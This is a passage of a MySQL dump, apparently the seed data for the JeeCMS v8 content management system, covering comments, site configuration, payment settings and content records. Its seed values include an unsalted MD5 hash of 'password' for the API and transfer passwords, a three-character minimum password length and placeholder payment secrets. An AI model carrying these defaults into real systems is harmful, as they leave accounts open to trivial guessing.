INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (79,1);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (79,2);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (79,3);

#
# Source for table jc_chnl_group_view
#

CREATE TABLE `jc_chnl_group_view` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_v` (`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目浏览会员组关联表';

#
# Dumping data for table jc_chnl_group_view
#


#
# Source for table jc_comment
#

CREATE TABLE `jc_comment` (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `comment_user_id` int(11) DEFAULT NULL COMMENT '评论用户ID',
  `reply_user_id` int(11) DEFAULT NULL COMMENT '回复用户ID',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `create_time` datetime NOT NULL COMMENT '评论时间',
  `reply_time` datetime DEFAULT NULL COMMENT '回复时间',
  `ups` smallint(6) NOT NULL DEFAULT '0' COMMENT '支持数',
  `downs` smallint(6) NOT NULL DEFAULT '0' COMMENT '反对数',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `score` int(11) DEFAULT NULL COMMENT '评分',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级评论',
  `reply_count` int(11) DEFAULT '0' COMMENT '回复数',
  PRIMARY KEY (`comment_id`),
  KEY `fk_jc_comment_content` (`content_id`),
  KEY `fk_jc_comment_reply` (`reply_user_id`),
  KEY `fk_jc_comment_site` (`site_id`),
  KEY `fk_jc_comment_user` (`comment_user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COMMENT='CMS评论表';

#
# Dumping data for table jc_comment
#

INSERT INTO `jc_comment` (`comment_id`,`comment_user_id`,`reply_user_id`,`content_id`,`site_id`,`create_time`,`reply_time`,`ups`,`downs`,`is_recommend`,`is_checked`,`score`,`parent_id`,`reply_count`) VALUES (11,NULL,NULL,30,1,'2016-10-10 08:50:25',NULL,0,0,1,1,NULL,NULL,0);
INSERT INTO `jc_comment` (`comment_id`,`comment_user_id`,`reply_user_id`,`content_id`,`site_id`,`create_time`,`reply_time`,`ups`,`downs`,`is_recommend`,`is_checked`,`score`,`parent_id`,`reply_count`) VALUES (13,NULL,NULL,39,1,'2016-10-10 08:56:21',NULL,0,0,1,1,NULL,NULL,0);
INSERT INTO `jc_comment` (`comment_id`,`comment_user_id`,`reply_user_id`,`content_id`,`site_id`,`create_time`,`reply_time`,`ups`,`downs`,`is_recommend`,`is_checked`,`score`,`parent_id`,`reply_count`) VALUES (14,NULL,NULL,130,1,'2016-10-10 14:00:12',NULL,0,0,1,1,NULL,NULL,0);
INSERT INTO `jc_comment` (`comment_id`,`comment_user_id`,`reply_user_id`,`content_id`,`site_id`,`create_time`,`reply_time`,`ups`,`downs`,`is_recommend`,`is_checked`,`score`,`parent_id`,`reply_count`) VALUES (15,NULL,NULL,132,1,'2016-10-10 14:01:13',NULL,0,0,1,1,NULL,NULL,0);

#
# Source for table jc_comment_ext
#

CREATE TABLE `jc_comment_ext` (
  `comment_id` int(11) NOT NULL,
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `text` longtext COMMENT '评论内容',
  `reply` longtext COMMENT '回复内容',
  KEY `fk_jc_ext_comment` (`comment_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS评论扩展表';

#
# Dumping data for table jc_comment_ext
#

INSERT INTO `jc_comment_ext` (`comment_id`,`ip`,`text`,`reply`) VALUES (11,'117.41.152.66','早就该这样了，不知道多少不法分子利用不实名手机号进行诈骗。','');
INSERT INTO `jc_comment_ext` (`comment_id`,`ip`,`text`,`reply`) VALUES (13,'117.41.152.66','四川人民伤不起，忘国家加紧开展救援以及灾后重建工作。','');
INSERT INTO `jc_comment_ext` (`comment_id`,`ip`,`text`,`reply`) VALUES (14,'117.41.152.66','保持定力：坚持走中国特色解决民族问题的正确道路','');
INSERT INTO `jc_comment_ext` (`comment_id`,`ip`,`text`,`reply`) VALUES (15,'117.41.152.66','燃烧吧小宇宙，中国大妈征服世界，哈哈哈哈...','');

#
# Source for table jc_config
#

CREATE TABLE `jc_config` (
  `config_id` int(11) NOT NULL,
  `context_path` varchar(20) DEFAULT '/JeeCms' COMMENT '部署路径',
  `servlet_point` varchar(20) DEFAULT NULL COMMENT 'Servlet挂载点',
  `port` int(11) DEFAULT NULL COMMENT '端口',
  `db_file_uri` varchar(50) NOT NULL DEFAULT '/dbfile.svl?n=' COMMENT '数据库附件访问地址',
  `is_upload_to_db` tinyint(1) NOT NULL DEFAULT '0' COMMENT '上传附件至数据库',
  `def_img` varchar(255) NOT NULL DEFAULT '/JeeCms/r/cms/www/default/no_picture.gif' COMMENT '图片不存在时默认图片',
  `login_url` varchar(255) NOT NULL DEFAULT '/login.jspx' COMMENT '登录地址',
  `process_url` varchar(255) DEFAULT NULL COMMENT '登录后处理地址',
  `mark_on` tinyint(1) NOT NULL DEFAULT '1' COMMENT '开启图片水印',
  `mark_width` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小宽度',
  `mark_height` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小高度',
  `mark_image` varchar(100) DEFAULT '/r/cms/www/watermark.png' COMMENT '图片水印',
  `mark_content` varchar(100) NOT NULL DEFAULT 'www.jeecms.com' COMMENT '文字水印内容',
  `mark_size` int(11) NOT NULL DEFAULT '20' COMMENT '文字水印大小',
  `mark_color` varchar(10) NOT NULL DEFAULT '#FF0000' COMMENT '文字水印颜色',
  `mark_alpha` int(11) NOT NULL DEFAULT '50' COMMENT '水印透明度（0-100）',
  `mark_position` int(11) NOT NULL DEFAULT '1' COMMENT '水印位置(0-5)',
  `mark_offset_x` int(11) NOT NULL DEFAULT '0' COMMENT 'x坐标偏移量',
  `mark_offset_y` int(11) NOT NULL DEFAULT '0' COMMENT 'y坐标偏移量',
  `count_clear_time` date NOT NULL COMMENT '计数器清除时间',
  `count_copy_time` datetime NOT NULL COMMENT '计数器拷贝时间',
  `download_code` varchar(32) NOT NULL DEFAULT 'jeecms' COMMENT '下载防盗链md5混淆码',
  `download_time` int(11) NOT NULL DEFAULT '12' COMMENT '下载有效时间（小时）',
  `email_host` varchar(50) DEFAULT NULL COMMENT '邮件发送服务器',
  `email_encoding` varchar(20) DEFAULT NULL COMMENT '邮件发送编码',
  `email_username` varchar(100) DEFAULT NULL COMMENT '邮箱用户名',
  `email_password` varchar(100) DEFAULT NULL COMMENT '邮箱密码',
  `email_personal` varchar(100) DEFAULT NULL COMMENT '邮箱发件人',
  `email_validate` tinyint(1) DEFAULT '0' COMMENT '开启邮箱验证',
  `view_only_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '只有终审才能浏览内容页',
  `flow_clear_time` date NOT NULL COMMENT '流量统计清除时间',
  `channel_count_clear_time` date NOT NULL COMMENT '栏目发布内容计数器清除时间',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置表';

#
# Dumping data for table jc_config
#

INSERT INTO `jc_config` (`config_id`,`context_path`,`servlet_point`,`port`,`db_file_uri`,`is_upload_to_db`,`def_img`,`login_url`,`process_url`,`mark_on`,`mark_width`,`mark_height`,`mark_image`,`mark_content`,`mark_size`,`mark_color`,`mark_alpha`,`mark_position`,`mark_offset_x`,`mark_offset_y`,`count_clear_time`,`count_copy_time`,`download_code`,`download_time`,`email_host`,`email_encoding`,`email_username`,`email_password`,`email_personal`,`email_validate`,`view_only_checked`,`flow_clear_time`,`channel_count_clear_time`) VALUES (1,'/jeecmsv8f',NULL,8080,'/dbfile.svl?n=',0,'/r/cms/www/no_picture.gif','/login.jspx',NULL,0,120,120,'/r/cms/www/watermark.png','www.jeecms.com',40,'#FF0000',100,1,0,0,'2016-10-14','2016-10-14 09:56:20','jeecms',12,NULL,NULL,NULL,NULL,NULL,0,0,'2016-10-14','2016-10-13');

#
# Source for table jc_config_attr
#

CREATE TABLE `jc_config_attr` (
  `config_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置属性表';

#
# Dumping data for table jc_config_attr
#

INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'password_min_len','3');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'username_reserved','');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'register_on','true');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'member_on','true');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'username_min_len','5');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'version','jeecms-v8');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'user_img_height','98');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'user_img_width','143');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'check_on','false');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'new_picture','/r/cms/www/new.gif');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'day','3');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'preview','false');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'qqEnable','false');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'sinaKey','');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'sinaEnable','false');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'qqID','101139646');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'qqKey','');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'sinaID','2510334929');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'qqWeboEnable','false');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'qqWeboKey','');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'qqWeboID','801526383');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'ssoEnable','false');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'flowSwitch','true');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'contentFreshMinute','0');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'codeImgWidth','160');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'codeImgHeight','160');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'reward_fix_4','4');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'reward_fix_1','1');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'reward_fix_3','3');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'reward_fix_2','2');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'reward_fix_5','5');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'reward_fix_6','6');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'weixinAppId','1212');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'weixinAppSecret','121212');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'weixinLoginId','1212');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'weixinLoginSecret','121212');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'commentOpen','true');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'guestbookOpen','true');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'guestbookNeedLogin','true');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'guestbookDayLimit','0');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'commentDayLimit','0');
INSERT INTO `jc_config_attr` (`config_id`,`attr_name`,`attr_value`) VALUES (1,'apiAccountMngPassword','5f4dcc3b5aa765d61d8327deb882cf99');

#
# Source for table jc_config_content_charge
#

CREATE TABLE `jc_config_content_charge` (
  `config_content_id` int(11) NOT NULL DEFAULT '1',
  `weixin_appid` varchar(255) NOT NULL DEFAULT '' COMMENT '微信服务号APPID',
  `weixin_secret` varchar(50) NOT NULL DEFAULT '' COMMENT '微信公众号secret',
  `weixin_account` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户号',
  `weixin_password` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户密钥',
  `alipay_partner_id` varchar(255) DEFAULT NULL COMMENT '支付宝合作者ID',
  `alipay_account` varchar(255) DEFAULT NULL COMMENT '支付宝签约账户',
  `alipay_key` varchar(1000) DEFAULT NULL COMMENT '支付宝公钥',
  `alipay_appid` varchar(255) DEFAULT NULL COMMENT '支付宝应用ID',
  `alipay_public_key` varchar(255) DEFAULT '' COMMENT '支付宝RSA公钥',
  `alipay_private_key` varchar(1000) DEFAULT NULL COMMENT '支付宝RSA私钥',
  `charge_ratio` double(5,2) NOT NULL DEFAULT '0.00' COMMENT '抽成比例',
  `min_draw_amount` double(11,2) NOT NULL DEFAULT '1.00' COMMENT '最小提现额',
  `commission_total` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成总金额',
  `commission_year` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成年金额',
  `commission_month` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成月金额',
  `commission_day` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `pay_transfer_password` varchar(100) NOT NULL DEFAULT '5f4dcc3b5aa765d61d8327deb882cf99' COMMENT '转账支付密码（管理后台验证）',
  `transfer_api_password` varchar(100) NOT NULL DEFAULT '' COMMENT '企业转账接口API密钥',
  `reward_min` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  `reward_max` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT '0' COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`config_content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='内容收费配置';

#
# Dumping data for table jc_config_content_charge
#

INSERT INTO `jc_config_content_charge` (`config_content_id`,`weixin_appid`,`weixin_secret`,`weixin_account`,`weixin_password`,`alipay_partner_id`,`alipay_account`,`alipay_key`,`alipay_appid`,`alipay_public_key`,`alipay_private_key`,`charge_ratio`,`min_draw_amount`,`commission_total`,`commission_year`,`commission_month`,`commission_day`,`last_buy_time`,`pay_transfer_password`,`transfer_api_password`,`reward_min`,`reward_max`,`reward_pattern`) VALUES (1,'1','2','3','4','1','1','1','1','1','1',0.1,1,0,0,0,0,'2016-10-11 11:40:48','5f4dcc3b5aa765d61d8327deb882cf99','4',0.01,1,0);

#
# Source for table jc_config_item
#

CREATE TABLE `jc_config_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型 "1":"字符串文本","2":"整型文本","3":"浮点型文本","4":"文本区","5":"日期","6":"下拉列表","7":"复选框","8":"单选框"',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填',
  `category` int(11) NOT NULL DEFAULT '1' COMMENT '模型项目所属分类（1注册模型）',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置模型项表';

#
# Dumping data for table jc_config_item
#


#
# Source for table jc_content
#

CREATE TABLE `jc_content` (
  `content_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) NOT NULL COMMENT '栏目ID',
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `type_id` int(11) NOT NULL COMMENT '属性ID',
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `sort_date` datetime NOT NULL COMMENT '排序日期',
  `top_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '固顶级别',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有标题图',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `status` tinyint(4) NOT NULL DEFAULT '2' COMMENT '状态(0:草稿;1:审核中;2:审核通过;3:回收站;4:投稿;5:归档)',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `score` int(11) NOT NULL DEFAULT '0' COMMENT '得分',
  `recommend_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '推荐级别',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_site` (`site_id`),
  KEY `fk_jc_content_type` (`type_id`),
  KEY `fk_jc_content_user` (`user_id`),
  KEY `fk_jc_contentchannel` (`channel_id`),
  KEY `fk_jc_content_model` (`model_id`),
  KEY `index_jc_content_top_level_sort` (`top_level`,`sort_date`),
  KEY `index_jc_content_status` (`status`),
  KEY `index_jc_content_sort_date` (`sort_date`),
  KEY `index_jc_content_is_recommend` (`is_recommend`),
  KEY `index_jc_content_recommend_level` (`recommend_level`)
) ENGINE=InnoDB AUTO_INCREMENT=142 DEFAULT CHARSET=utf8 COMMENT='CMS内容表';

#
# Dumping data for table jc_content
#

INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (2,76,1,2,5,1,'2016-07-15 14:47:24',0,0,0,2,1,0,0,0,0,0);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (7,76,1,2,5,1,'2016-07-15 15:33:26',0,0,1,2,17,0,0,0,0,0);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (11,75,1,1,1,1,'2016-07-15 16:23:32',0,0,0,2,1,0,0,0,0,0);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (12,75,1,1,1,1,'2016-07-15 17:22:47',0,0,0,2,1,0,0,0,1,0);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (13,76,1,2,5,1,'2016-07-19 14:12:48',1,0,1,2,3,0,0,0,0,0);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (14,75,1,2,1,1,'2016-07-19 14:26:30',0,0,0,2,21,0,0,14,13,0);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (23,75,1,1,1,1,'2016-09-13 17:16:04',0,0,0,2,16,0,0,12,11,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (27,75,1,2,1,1,'2016-09-22 16:30:13',0,0,0,2,1,0,0,2,2,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (28,75,1,2,1,1,'2016-09-22 16:56:46',0,0,0,2,4,0,0,2,2,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (29,75,1,1,1,1,'2016-09-23 09:07:33',0,0,0,2,1,0,0,1,1,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (30,75,1,1,1,1,'2016-09-23 09:09:41',0,0,0,2,54,1,0,44,41,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (32,75,1,2,1,1,'2016-09-23 09:19:38',0,0,0,2,2,0,0,1,2,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (33,75,1,2,1,1,'2016-09-23 09:23:39',0,0,0,2,18,0,0,18,18,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (36,75,1,2,1,1,'2016-09-23 09:40:21',0,0,0,2,0,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (37,75,1,2,1,1,'2016-09-23 09:43:34',0,0,0,2,2,0,0,1,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (39,75,1,2,1,1,'2016-09-23 09:54:17',0,0,0,2,27,1,0,17,18,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (43,79,1,1,8,1,'2016-09-26 09:33:15',0,0,0,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (44,79,1,1,8,1,'2016-09-26 09:34:35',0,0,0,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (45,79,1,1,8,1,'2016-09-26 09:38:39',0,0,0,2,17,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (46,79,1,1,8,1,'2016-09-26 09:45:02',0,0,0,2,17,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (47,79,1,1,8,1,'2016-09-26 09:47:54',0,0,0,2,16,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (48,79,1,1,8,1,'2016-09-26 09:50:04',0,0,0,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (49,79,1,1,8,1,'2016-09-26 09:51:13',0,0,0,2,16,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (50,79,1,1,8,1,'2016-09-26 09:54:56',0,0,0,2,16,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (51,79,1,1,8,1,'2016-09-26 09:56:01',0,0,0,2,5,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (53,77,1,2,6,1,'2016-09-26 10:19:13',0,0,0,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (55,77,1,2,6,1,'2016-09-26 10:20:11',0,0,0,2,0,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (57,77,1,2,6,1,'2016-09-26 10:21:19',0,0,0,2,4,0,0,0,0,1);
